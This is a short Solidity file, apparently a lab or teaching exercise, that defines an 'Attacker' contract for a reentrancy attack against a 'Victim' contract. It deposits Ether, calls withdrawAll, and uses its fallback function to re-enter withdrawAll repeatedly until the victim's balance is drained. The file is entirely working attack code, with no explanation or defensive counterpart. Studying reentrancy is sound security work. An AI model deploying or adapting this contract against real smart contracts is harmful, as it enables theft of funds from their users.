// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Victim {
  function deposit() external payable;
  function withdrawAll() external;
  function getBalance() external view returns (uint256);
  function getUserBalance(address _user) external view returns (uint256);
}

contract Attacker {
    Victim victim;
    uint256 count_attack = 0;

    constructor(address _victim){
      victim = Victim(_victim);
    }

    function putBalance() external payable {
      victim.deposit{value:msg.value}();
    }

    // 16 is max in Remix
    function attack(uint256 max) public {
      count_attack = max;
      victim.withdrawAll();
    }

    fallback() external payable {
      if (victim.getBalance() >= victim.getUserBalance(address(this)) &&
        count_attack > 0) {
        count_attack--;
        victim.withdrawAll();
      }
    }
}